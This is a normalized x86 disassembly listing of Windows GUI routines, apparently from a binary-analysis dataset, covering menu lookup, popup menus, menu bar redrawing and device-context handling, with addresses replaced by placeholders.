add ebx 0x2
mov [ ebx ] 0x0
test di 0x1
je r-xdata
mov [ ebx ] 0x40
add ebx 0x2
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
add ebx 0x2
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
add ebx 0x2
mov [ ebx ] 0x0
sub_467e50
push ebp
mov ebp esp
add esp 0xfffffbfc
push ebx
mov [ ebp - 0x404 ] eax
xor ebx ebx
mov [ ebp - 0x400 ] 0x0
mov eax [ ebp - 0x404 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x404 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x404 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_467d80
pop ecx
mov bl 0x1
mov eax [ ebp - 0x404 ]
add eax 0x50
lea edx [ ebp - 0x400 ]
mov ecx 0x200
call sub_449f14
mov eax [ ebp - 0x404 ]
mov eax [ eax + 0x50 ]
call sub_449db8
lea edx [ ebp - 0x400 ]
call sub_4361f0
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_467ee4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x3d ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_467f58
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_468478
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_468478
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
movzx edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_468478
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x6 ]
mov [ eax + 0x3d ] dl
retn
sub_467f64
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_467e50
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_467ee4
mov eax ebx
call sub_46849c
jmp r-xdata
sub_467fcc
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
movzx ecx [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_468014
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x44 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x40 ]
call sub_44fe8c
mov eax ebx
call sub_467538
pop esi
pop ebx
retn
mov edx [ ebx + 0x40 ]
call sub_44fed0
mov edx ebx
mov eax [ ebx + 0x44 ]
call sub_42e354
sub_468050
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_42e5b0
cmp esi [ edi + 0x44 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_468014
sub_468094
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_4675ec
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_4675ec
mov esi eax
xor eax eax
movzx eax [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_476f74
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_4680f0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0xa ] dx
xor edx edx
push ebp
push sub_46823d
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0xa ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_4675ec
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_4675ec
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_466084
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_466094
mov ebx eax
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x30 ]
movzx edx [ edx ]
call sub_449e98
lea eax [ ebp - 0x8 ]
movzx edx [ ebp + 0x8 ]
call sub_449e98
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push edi
mov eax [ ebp - 0x8 ]
call sub_449db8
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
push 0x1
push 0x400
call CompareStringW
sub eax 0x2
test eax eax
jne r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4494dc
xor eax eax
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_469090
cmp [ ebp - 0x10 ] 0x0
sete al
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468244
lea eax [ ebp - 0x10 ]
call j_sub_449348
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
mov ebx eax
jmp r-xdata
sub_468250
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
movzx eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_468094
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
movzx eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_4680f0
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_4683cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_467770
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringW
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_4675ec
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_4675ec
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_4361d0
mov eax [ ebp + 0x10 ]
call sub_4360a4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_46849c
push ebx
mov ebx eax
cmp [ ebx + 0x3d ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_48a70c
test eax eax
je r-xdata
movzx edx [ eax + 0x5f ]
mov eax ebx
call sub_468478
mov [ ebx + 0x3d ] 0x1
sub_4684c4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x3d ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4483ac
movzx edx [ eax + 0x5f ]
mov eax ebx
call sub_468478
mov [ ebx + 0x3d ] 0x1
sub_468558
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
movzx eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_467fcc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_467e50
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageW
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_4685ec
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageW
sub_468628
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_468652
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_468674
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x38 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_468bc6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcW
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468bcd
lea eax [ ebp - 0x38 ]
call j_sub_449348
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4246e8
mov edx [ esi + 0x4 ]
call sub_4676a8
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_483034
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4246e8
movzx edx [ esi + 0x4 ]
call sub_46768c
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e0ac
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4689db
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4689be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x2c ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_46e950
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ ebp - 0x14 ]
call sub_46e7e4
mov eax [ ebp - 0x2c ]
movzx eax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x2c ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_468e8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4689c5
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_46e950
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x34 ]
call sub_468250
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x34 ]
call sub_4675ec
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4246e8
mov edx [ ebp - 0x2c ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_4675ec
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_468b3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e0ac
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_468b17
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_468afa
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_46e950
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ ebp - 0x14 ]
call sub_46e7e4
mov eax [ ebp - 0x30 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x30 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov eax [ ebp - 0x30 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x30 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x10 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468b01
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_46e950
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x54 ]
call sub_48aae4
mov edx [ ebp - 0x38 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_483034
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4246e8
mov edx [ ebp - 0x30 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_4675ec
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4246e8
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_4675ec
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4246e8
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4246e8
movzx ecx [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_4675ec
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4246e8
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x34 ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4246e8
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_46761c
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4246e8
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x28 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x64 ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4246e8
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_46761c
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x280 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x160 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_482c20
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_482ca8
jmp r-xdata
sub_468b1e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_468bd4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_424590
pop esi
pop ebx
retn
push ebx
push sub_468628
call sub_42f400
mov [ ebx + 0x10 ] eax
sub_468c18
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_467414
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x170 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_468bd4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_468c90
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_468bfc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4674c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_468ce8
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x3d ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_462290
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ eax + 0x31 ]
mov eax ebx
call sub_468478
mov [ ebx + 0x3d ] 0x1
movzx edx [ eax + 0x5f ]
mov eax ebx
call sub_468478
mov [ ebx + 0x3d ] 0x1
jmp r-xdata
sub_468d34
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x3d ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_462290
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4811dc
mov edx eax
jmp r-xdata
mov si 0xffc7
call sub_4483f8
mov edx eax
jmp r-xdata
sub_468d80
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_432a5c
mov edx esp
mov eax ebx
call sub_468e30
mov eax ebx
call sub_468ce8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_466cd0
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_46725c
mov eax [ ebx + 0x34 ]
call sub_4632f8
mov eax ebx
call sub_467ee4
mov eax ebx
call sub_468d34
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
movzx edx [ ebx + 0x60 ]
movzx ebp [ eax + edx * 2 ]
movzx eax [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
movzx eax [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_46342c
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_468e30
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx [ esp ]
mov [ eax + 0x58 ] edx
mov edx [ esp + 0x4 ]
mov [ eax + 0x5c ] edx
pop ecx
pop edx
pop edi
pop esi
retn
sub_468e50
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4246e8
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4246e8
cmp ebp [ eax ]
jne r-xdata
sub_468e8c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_46df1c
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_46d5ac
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_46df1c
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_46d5ac
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_4483f8
mov edx [ r-xdata ]
call sub_448388
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_46df1c
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_46d5ac
jmp r-xdata
movzx eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_468f74
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_449d2c
mov ebp 0x1
jmp r-xdata
mov eax [ esi ]
call sub_449fc4
cmp ebp eax
jle r-xdata
mov eax [ esi ]
movzx edi [ eax + ebp * 2 - 0x2 ]
cmp di 0xd800
jb r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
xor ebx ebx
jmp r-xdata
cmp di 0xdfff
jbe r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov eax [ esi ]
cmp [ eax + ebp * 2 - 0x2 ] 0x26
jne r-xdata
inc ebp
jmp r-xdata
inc ebp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov [ esp + 0xb ] 0x0
cmp ebp 0x1
jle r-xdata
mov eax esi
mov ecx 0x1
mov edx ebp
call sub_44a438
mov edx ebp
dec edx
mov eax esi
mov ecx 0x4
call sub_44a438
jmp r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esp ]
mov [ esp + 0x4 ] eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov [ esp + 0x9 ] 0x0
